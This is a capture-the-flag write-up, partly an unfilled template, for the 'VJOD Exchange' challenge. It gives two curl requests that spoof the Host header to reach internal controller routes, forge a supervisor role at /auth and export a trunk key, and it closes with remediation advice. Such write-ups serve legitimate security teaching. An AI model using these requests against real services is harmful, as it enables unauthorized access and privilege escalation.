### VJOD Exchange

> [fill in] · [fill in] · [fill in]
> Points at solve: [fill in]

**Tools used**

curl.

**Approach**

1. Recon: the status page's `/static/switchboard.js` decodes its controller hostname:

```text
exch-ctl.vjod.internal
```

The public board also exposed `/api/lines`, but the controller routes were available by sending the internal hostname in the `Host` header to the challenge address. The controller overview listed `POST /auth` and `GET /export/trunk-key`. Only requests to the challenge instance were made.

2. Authenticate with a supervisor role while routing to the controller:

```bash
curl -i 'http://<instance>/auth' \
  -H 'Host: exch-ctl.vjod.internal' \
  -H 'Content-Type: application/json' \
  --data '{"username":"EX-01","role":"supervisor"}'
```

3. Use the returned `ctl_sid` cookie to export the key:

```bash
curl -i 'http://<instance>/export/trunk-key' \
  -H 'Host: exch-ctl.vjod.internal' \
  -H 'Cookie: ctl_sid=<cookie from auth response>'
```

**Why it works**

The controller used the untrusted `Host` header alone to select internal-trunk routing, so an outside caller could reach internal controller routes by spoofing `exch-ctl.vjod.internal`. `/auth` accepted a caller-supplied `role` without validating it against trusted server-side operator records, so anyone could mint a supervisor session. The trunk-key export trusted that session, yielding the key.

Remediation: do not use an untrusted `Host` header alone for internal service authorization or routing; derive session roles exclusively from trusted server-side operator records and ignore/reject client-supplied role values; isolate the controller from public ingress; validate authorization on every export.

**Validation**

The `/export/trunk-key` request with the supervisor `ctl_sid` cookie returned the trunk key and the flag: `CSCTF{REDACTED}`.
